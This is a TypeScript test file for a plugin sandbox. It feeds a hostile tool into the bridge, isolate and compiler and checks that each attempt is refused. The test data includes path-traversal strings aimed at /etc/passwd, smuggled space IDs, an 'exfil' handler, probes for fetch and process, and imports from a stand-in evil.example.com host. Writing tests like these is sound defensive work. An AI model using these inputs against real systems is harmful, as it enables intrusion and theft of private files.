/**
 * The adversarial escape suite, server half — one hostile Tool, every door.
 *
 * tests/tools-bridge.test.ts proves the bridge behaves for a Tool that means
 * well. This file asks the opposite question: given a Tool that is actively
 * trying to get out, does each limit hold, and does it hold BEFORE the thing it
 * is guarding happens? Every dependency below throws when called, so a passing
 * test says the gate refused without ever reaching contextService, the connector
 * runtime or the agent scheduler — an error returned after the read would be a
 * leak wearing a refusal's clothes.
 *
 * The Tool under test is always the same one: it declares `read: ["deals/**"]`
 * and nothing else. That one declaration is what every refusal here is measured
 * against — a write it never asked for, a connector it never named, a path
 * outside the glob, a handler in the isolate reaching past it.
 *
 * The browser half of the same story — cookies, top navigation, popups, CSP,
 * localStorage, a forged postMessage — cannot be asserted without a browser and
 * lives in scripts/verify-tools-escape.ts, which drives a real hostile Tool
 * (scripts/fixtures/tools/hostile/) in headless Chromium.
 *
 * Run: pnpm --filter @visvine/web exec node --import tsx --test tests/tools-escape.test.ts
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import { runInIsolate } from '@/lib/connectors/isolate'
import { handleBridgeCall, type BridgeDeps } from '@/lib/tools/bridge'
import { compileToolUi } from '@/lib/tools/compile'
import { runDataHandler } from '@/lib/tools/dataRun'
import { RATE_WINDOW_MS, bridgeRateKey, resetBridgeLimits, takeBridgeCall } from '@/lib/tools/limits'
import { getToolState, resetPreviewToolState, setToolState, STATE_MAX_BYTES } from '@/lib/tools/state'
import { resolveBridgeTarget, type ResolvedTarget, type TargetDeps } from '@/lib/tools/target'
import { EMPTY_PERIMETER, type ToolPerimeter } from '@/lib/tools/perimeter'
import { BRIDGE_LIMITS, type BridgeError, type BridgeResponse } from '@/lib/tools/protocol'
import { OPEN_ACCESS } from '@/lib/notes/shared/authz'
import type { NoteMeta } from '@/lib/notes/shared/types'
import type { ContextPrincipal } from '@/lib/notes/shared/contextTypes'
import type { ResolvedContext } from '@/lib/notes/resolve'
import type { SessionPayload } from '@/lib/session'

// ── the hostile tool ──────────────────────────────────────────────────────────

/** The space the Tool runs in. Everything it may touch lives here. */
const SPACE = 'space-a'
/** Another space, named only by the attacker. Nothing here is ever reachable. */
const OTHER_SPACE = 'space-b'

const SESSION: SessionPayload = { userId: 'user-1', name: 'Viewer', email: 'viewer@local.dev' }

const VIEWER: ContextPrincipal = {
  userId: 'user-1',
  email: 'viewer@local.dev',
  name: 'Viewer',
  spaceId: SPACE,
  spaceAdmin: false,
  access: OPEN_ACCESS,
}

function perimeter(over: Partial<ToolPerimeter> = {}): ToolPerimeter {
  return { ...EMPTY_PERIMETER, read: [], write: [], types: [], connectors: [], agents: [], ...over }
}

/** The one declaration this whole file is measured against. */
const DECLARED = perimeter({ read: ['deals/**'] })

function target(over: Partial<ResolvedTarget> = {}): ResolvedTarget {
  const p = over.perimeter ?? DECLARED
  return {
    spaceId: SPACE,
    principal: VIEWER,
    context: { spaceId: SPACE, ownerKey: 'shared' },
    perimeter: p,
    config: {
      name: 'hostile',
      title: 'Hostile',
      description: '',
      version: 1,
      surfaces: { rail: null, types: [] },
      perimeter: p,
      tags: [],
      previewUrl: null,
    },
    dataBundle: '',
    installId: 'install-1',
    degraded: null,
    install: { slug: 'hostile', title: 'Hostile', key: `${SPACE}/hostile` },
    isAdmin: false,
    subject: null,
    ...over,
  }
}

/** Every dependency, wired to fail the test if the gate lets a call through. */
function deps(over: Partial<BridgeDeps> = {}): BridgeDeps {
  const forbidden = (name: string) => () => {
    throw new Error(`${name} was called — the gate should have refused first`)
  }
  const base = {
    visibleVault: forbidden('visibleVault'),
    readVisible: forbidden('readVisible'),
    searchContext: forbidden('searchContext'),
    writeGated: forbidden('writeGated'),
    appendLogGated: forbidden('appendLogGated'),
    loadConnector: forbidden('loadConnector'),
    executeConnectorScript: forbidden('executeConnectorScript'),
    canTriggerRun: forbidden('canTriggerRun'),
    claimManualRun: forbidden('claimManualRun'),
    getToolState: forbidden('getToolState'),
    setToolState: forbidden('setToolState'),
    runDataHandler: forbidden('runDataHandler'),
    // Auditing is a record, never a gate: a no-op rather than a trap.
    logAudit: async () => {},
  }
  return { ...(base as unknown as BridgeDeps), ...over }
}

function note(path: string): NoteMeta {
  return {
    path,
    title: path.split('/').pop()!.replace(/\.md$/, ''),
    folder: path.split('/').slice(0, -1).join('/'),
    frontmatter: {},
    tags: [],
    linkTargets: [],
    unresolved: [],
    mtime: Date.UTC(2026, 7, 18),
  }
}

/** The stored shape resolveBridgeTarget reads off an install row. */
const INSTALL_ROW = {
  id: 'install-1',
  spaceId: SPACE,
  slug: 'hostile',
  key: `${SPACE}/hostile`,
  enabled: true,
  requirements: {},
  version: {
    name: 'hostile',
    title: 'Hostile',
    config: { title: 'Hostile' },
    perimeter: { read: ['deals/**'] },
    dataBundle: '',
  },
}

function resolvedContext(over: Partial<ResolvedContext> = {}): ResolvedContext {
  return {
    spaceId: SPACE,
    ownerKey: 'shared',
    scope: 'shared',
    isAdmin: false,
    isPersonalSpace: false,
    actor: { id: 'user-1', name: 'Viewer', email: 'viewer@local.dev' },
    ...over,
  }
}

/** Every dependency, wired to fail the test if the gate lets a call through. */
function targetDeps(over: Partial<TargetDeps> = {}): TargetDeps {
  const forbidden = (name: string) => () => {
    throw new Error(`${name} was called — the gate should have refused first`)
  }
  const base = {
    findInstall: forbidden('findInstall'),
    findBuild: forbidden('findBuild'),
    resolveContext: forbidden('resolveContext'),
    principalOf: forbidden('principalOf'),
    readVisible: forbidden('readVisible'),
    featureAccessForbidden: forbidden('featureAccessForbidden'),
  }
  return { ...(base as unknown as TargetDeps), ...over }
}

/** The error on a response the test expects to have failed. */
function errorOf(response: BridgeResponse): { code: string; message: string } {
  assert.equal(response.ok, false, `expected a refusal, got ${JSON.stringify(response).slice(0, 200)}`)
  return response.ok ? { code: '', message: '' } : response.error
}

/** The value on a response the test expects to have succeeded. */
function valueOf(response: BridgeResponse): unknown {
  assert.equal(response.ok, true, `expected success, got ${JSON.stringify(response).slice(0, 200)}`)
  return response.ok ? response.value : null
}

test.beforeEach(() => {
  resetBridgeLimits()
  resetPreviewToolState()
})

// ── reading past the perimeter ────────────────────────────────────────────────

test('a read outside the declared globs is refused, and the vault is never opened', async () => {
  const error = errorOf(
    await handleBridgeCall(target(), 'context.read', { path: 'salaries/pay.md' }, deps()),
  )
  assert.equal(error.code, 'perimeter')
  assert.match(error.message, /salaries\/pay\.md is not in this tool's read globs \(deals\/\*\*\)/)
})

test('list and search cannot be used to enumerate outside the perimeter', async () => {
  // Search over an undeclared reach must SAY so rather than come back empty:
  // searchContext is a trap here, so nothing was ranked before the refusal.
  const search = errorOf(
    await handleBridgeCall(target({ perimeter: perimeter() }), 'context.search', { query: 'salary' }, deps()),
  )
  assert.equal(search.code, 'perimeter')

  // And a caller-supplied `**` widens nothing: the vault comes back whole and
  // the perimeter is what cuts it down.
  const listed = valueOf(
    await handleBridgeCall(
      target(),
      'context.list',
      { glob: '**' },
      deps({ visibleVault: async () => ({ raws: [], metas: [note('deals/acme.md'), note('salaries/pay.md')] }) }),
    ),
  ) as Array<{ path: string }>
  assert.deepEqual(listed.map((row) => row.path), ['deals/acme.md'])
})

test('a write is refused when the tool declared reads only', async () => {
  const written = errorOf(
    await handleBridgeCall(target(), 'context.write', { path: 'deals/acme.md', content: '# owned' }, deps()),
  )
  assert.equal(written.code, 'perimeter')
  assert.match(written.message, /declares no write globs/)

  const appended = errorOf(
    await handleBridgeCall(target(), 'context.append', { path: 'deals/acme.md', text: 'x' }, deps()),
  )
  assert.equal(appended.code, 'perimeter')
  assert.match(appended.message, /declares no write globs/)
})

// ── traversal ─────────────────────────────────────────────────────────────────

test('a `..` path is refused as invalid before any glob is consulted', async () => {
  for (const path of [
    'deals/../salaries/pay.md',
    'deals/../../etc/passwd',
    '../salaries/pay.md',
    'deals/./../salaries/pay.md',
    'deals\\..\\salaries\\pay.md',
  ]) {
    const error = errorOf(await handleBridgeCall(target(), 'context.read', { path }, deps()))
    assert.equal(error.code, 'invalid', `${path} must be invalid, not matched`)
  }
})

test('a percent-encoded traversal is never decoded, so it cannot climb out of the glob it matched', async () => {
  // `%2e%2e` is not a `..` segment to anything in this stack — not the bridge,
  // not the perimeter, not the note store — and that is the whole defence: it
  // travels as six literal characters, so the path handed to contextService is
  // byte-for-byte the one asked for and can only ever name a note that does not
  // exist. Decoding it anywhere would turn this into a real traversal.
  const asked = 'deals/%2e%2e/%2e%2e/salaries/pay.md'
  let handed: string | null = null
  const response = await handleBridgeCall(
    target(),
    'context.read',
    { path: asked },
    deps({
      readVisible: async (_principal, _context, path) => {
        handed = path
        return null
      },
    }),
  )
  assert.equal(handed, asked, 'the stored path must be the literal one, never a decoded one')
  assert.equal(errorOf(response).code, 'not_found')

  // And once the encoding puts the path outside `deals/` textually, the
  // perimeter refuses it like any other outside path.
  const outside = errorOf(
    await handleBridgeCall(target(), 'context.read', { path: '%2e%2e/salaries/pay.md' }, deps()),
  )
  assert.equal(outside.code, 'perimeter')
})

// ── cross-space ───────────────────────────────────────────────────────────────

test('a spaceId smuggled into params changes nothing — the target decides the space', async () => {
  // Cross-space access is meaningless BY CONSTRUCTION rather than by a check: no
  // bridge method takes a space, so every call runs against `t.context`, which
  // resolveBridgeTarget derived from the install row. These params carry one
  // anyway, in three spellings, the way an attacker would.
  let sawContext: unknown = null
  const response = await handleBridgeCall(
    target(),
    'context.read',
    { path: 'deals/acme.md', spaceId: OTHER_SPACE, space_id: OTHER_SPACE, ownerKey: 'personal' },
    deps({
      readVisible: async (_principal, context) => {
        sawContext = context
        return '# Acme'
      },
    }),
  )
  assert.equal(response.ok, true)
  assert.deepEqual(sawContext, { spaceId: SPACE, ownerKey: 'shared' })
})

test('a spaceId smuggled into the target changes nothing — the install row decides', async () => {
  let askedFor: unknown = null
  const resolved = await resolveBridgeTarget(
    SESSION,
    { kind: 'install', installId: 'install-1', spaceId: OTHER_SPACE },
    targetDeps({
      findInstall: async () => INSTALL_ROW,
      resolveContext: async (_session, spaceId) => {
        askedFor = spaceId
        return resolvedContext()
      },
      principalOf: async () => VIEWER,
      featureAccessForbidden: async () => false,
    }),
  )
  assert.equal('code' in resolved, false, `expected success, got ${JSON.stringify(resolved)}`)
  const t = resolved as ResolvedTarget
  assert.equal(askedFor, SPACE, 'membership must be resolved against the install’s own space')
  assert.equal(t.spaceId, SPACE)
  assert.deepEqual(t.context, { spaceId: SPACE, ownerKey: 'shared' })
})

test('a preview target naming a space the viewer is not in is refused by the membership gate', async () => {
  // A preview target DOES name a space — that is what a preview is — so the
  // defence there is resolveContext, the same membership gate every web route
  // and the MCP layer use. readVisible is a trap: nothing is read first.
  const refused = await resolveBridgeTarget(
    SESSION,
    { kind: 'preview', spaceId: OTHER_SPACE, name: 'hostile' },
    targetDeps({
      resolveContext: async () =>
        new Response(JSON.stringify({ error: 'Not a member of this space.' }), { status: 403 }),
    }),
  )
  assert.equal('code' in refused, true, `expected a refusal, got ${JSON.stringify(refused)}`)
  assert.equal((refused as BridgeError).code, 'forbidden')
})

// ── connectors and agents ─────────────────────────────────────────────────────

test('a connector the tool never declared is refused before it is loaded', async () => {
  const error = errorOf(
    await handleBridgeCall(target(), 'connectors.call', { name: 'stripe', code: 'return 1' }, deps()),
  )
  assert.equal(error.code, 'perimeter')
  assert.match(error.message, /declares no connectors/)
})

test('an agent the tool never declared is refused before the scheduler is touched', async () => {
  const error = errorOf(await handleBridgeCall(target(), 'agents.run', { name: 'nightly' }, deps()))
  assert.equal(error.code, 'perimeter')
  assert.match(error.message, /declares no agents/)
})

test('a tool cannot author an agent brief it did not declare', async () => {
  // The escalation the seal exists to stop: write a brief naming any connector in
  // the space, then run it on the space's model key. A Tool may create the brief
  // of an agent its OWN perimeter names (bridge.ts#agentBriefExemption) — so the
  // write globs here are wide open and the agents list is `*`, which names nobody,
  // and the store is a trap: nothing may be written before the refusal.
  const t = target({ perimeter: perimeter({ read: ['deals/**'], write: ['**'], agents: ['*'] }) })
  for (const path of ['agents/nightly.md', 'agents/live/nightly.md']) {
    const error = errorOf(await handleBridgeCall(t, 'context.write', { path, content: '# x' }, deps()))
    assert.equal(error.code, 'forbidden', `${path} must be refused`)
  }
  const appended = errorOf(
    await handleBridgeCall(t, 'context.append', { path: 'agents/nightly.md', text: 'x' }, deps()),
  )
  assert.equal(appended.code, 'forbidden')
})

// ── data.js, on a real isolate ────────────────────────────────────────────────

test('a data.js handler reaching past the perimeter is refused in the perimeter’s own words', async () => {
  const t = target({
    dataBundle: `handlers.exfil = async (args, visvine) => await visvine.context.read('salaries/pay.md')`,
  })
  // The whole path: data.call takes a concurrency slot, installs the REAL bridge
  // handlers as isolate capabilities and runs the handler in QuickJS.
  // `readVisible` is a trap, so reaching the store fails the test.
  const error = errorOf(
    await handleBridgeCall(t, 'data.call', { fn: 'exfil', args: null }, deps({ runDataHandler })),
  )
  assert.equal(error.code, 'perimeter')
  assert.match(error.message, /salaries\/pay\.md is not in this tool's read globs/)
})

test('data.js has no fetch, sql, mcp, require or process to escape through', async () => {
  const t = target({
    dataBundle: `handlers.probe = async (args, visvine) => ({
      fetch: typeof fetch,
      sql: typeof sql,
      mcp: typeof mcp,
      require: typeof require,
      process: typeof process,
      XMLHttpRequest: typeof XMLHttpRequest,
      WebSocket: typeof WebSocket,
      read: typeof visvine.context.read,
    })`,
  })
  assert.deepEqual(
    valueOf(await handleBridgeCall(t, 'data.call', { fn: 'probe', args: null }, deps({ runDataHandler }))),
    {
      fetch: 'undefined',
      sql: 'undefined',
      mcp: 'undefined',
      require: 'undefined',
      process: 'undefined',
      XMLHttpRequest: 'undefined',
      WebSocket: 'undefined',
      // The one thing it DOES have, so this cannot pass by the handler simply
      // never running.
      read: 'function',
    },
  )
})

test('a data.js handler cannot disarm the gate by rewriting the globals it was handed', async () => {
  const t = target({
    dataBundle: `handlers.rewrite = async (args, visvine) => {
      const before = JSON.stringify(install)
      try { install.slug = 'other' } catch (e) { /* frozen */ }
      try { globalThis.visvine = { context: { read: async () => 'owned' } } } catch (e) { /* frozen */ }
      let refusal = null
      try { await visvine.context.read('salaries/pay.md') } catch (e) { refusal = e.message }
      return { before, after: JSON.stringify(install), refusal }
    }`,
  })
  const result = valueOf(
    await handleBridgeCall(t, 'data.call', { fn: 'rewrite', args: null }, deps({ runDataHandler })),
  ) as { before: string; after: string; refusal: string | null }
  assert.equal(result.after, result.before, '`install` is frozen host data, not the tool’s to edit')
  assert.match(result.refusal ?? '', /is not in this tool's read globs/)
})

test('a data.js handler that never returns is stopped by the isolate deadline', async () => {
  // The production deadline is BRIDGE_LIMITS.dataCallTimeoutMs; the run is
  // driven directly here with the isolate's own minimum so the same timeout path
  // is proven in a second rather than in twenty.
  const t = target({ dataBundle: 'handlers.spin = async () => { for (;;) {} }' })
  const error = errorOf(
    await runDataHandler(t, 'spin', null, {
      run: (gate, source, options) => runInIsolate({ ...gate, timeoutMs: 1_000 }, source, options),
    }),
  )
  assert.equal(error.code, 'timeout')
})

// ── caps ──────────────────────────────────────────────────────────────────────

test('an oversized write is refused as too_large before it reaches the store', async () => {
  const error = errorOf(
    await handleBridgeCall(
      target({ perimeter: perimeter({ read: ['deals/**'], write: ['deals/**'] }) }),
      'context.write',
      { path: 'deals/big.md', content: 'x'.repeat(BRIDGE_LIMITS.maxWriteBytes + 1) },
      deps(),
    ),
  )
  assert.equal(error.code, 'too_large')
  assert.match(error.message, new RegExp(String(BRIDGE_LIMITS.maxWriteBytes)))
})

test('the rate limiter trips on call callsPerMinute + 1 and recovers when the window slides', () => {
  const key = bridgeRateKey('user-1', 'install-1')
  const start = 1_000_000
  for (let i = 0; i < BRIDGE_LIMITS.callsPerMinute; i++) {
    assert.equal(takeBridgeCall(key, start + i).ok, true, `call ${i + 1} should be inside the budget`)
  }
  const tripped = takeBridgeCall(key, start + BRIDGE_LIMITS.callsPerMinute)
  assert.equal(tripped.ok, false)
  assert.equal(tripped.ok === false && tripped.retryAfterMs > 0, true, 'a refusal must say when to retry')

  // Another viewer, and the same viewer's other install, each keep their own
  // budget: one Tool in a loop must not lock a person out of the rest of Visvine.
  assert.equal(takeBridgeCall(bridgeRateKey('user-2', 'install-1'), start).ok, true)
  assert.equal(takeBridgeCall(bridgeRateKey('user-1', 'install-2'), start).ok, true)

  assert.equal(takeBridgeCall(key, start + RATE_WINDOW_MS + 1).ok, true)
})

test('a state value over STATE_MAX_BYTES (64KB) is refused rather than stored', async () => {
  const t = target({ installId: null, install: { preview: true, name: 'hostile' } })
  const stateDeps = deps({ getToolState, setToolState })
  const error = errorOf(
    await handleBridgeCall(t, 'state.set', { key: 'blob', value: 'x'.repeat(STATE_MAX_BYTES) }, stateDeps),
  )
  assert.equal(error.code, 'too_large')
  assert.equal(
    valueOf(await handleBridgeCall(t, 'state.get', { key: 'blob' }, stateDeps)),
    null,
    'a refused set must store nothing',
  )
})

// ── the compiler ──────────────────────────────────────────────────────────────

test('compileToolUi refuses a remote import', async () => {
  const result = await compileToolUi(
    "import x from 'https://evil.example.com/payload.js'\nexport default function Tool() { return x }\n",
  )
  assert.equal(result.ok, false)
  const messages = result.ok ? '' : result.errors.map((e) => e.message).join(' | ')
  assert.match(messages, /Cannot import "https:\/\/evil\.example\.com\/payload\.js"/)
  assert.match(messages, /Only react/)
})

test('compileToolUi refuses a node builtin', async () => {
  const result = await compileToolUi(
    "import fs from 'fs'\nexport default function Tool() { return fs.readFileSync('/etc/passwd', 'utf8') }\n",
  )
  assert.equal(result.ok, false)
  assert.match(result.ok ? '' : result.errors.map((e) => e.message).join(' | '), /Cannot import "fs"/)
})

test('compileToolUi refuses the ways a specifier can hide from the resolver', async () => {
  for (const source of [
    "const where = 'https://evil.example.com/p.js'\nexport default function Tool() { return import(where) }\n",
    "export default function Tool() { return import('https://evil' + '.example.com/p.js') }\n",
    "import fs from 'node:fs'\nexport default function Tool() { return fs }\n",
    "import './secrets'\nexport default function Tool() { return null }\n",
  ]) {
    const result = await compileToolUi(source)
    assert.equal(result.ok, false, `should not compile: ${source.split('\n')[0]}`)
  }
})
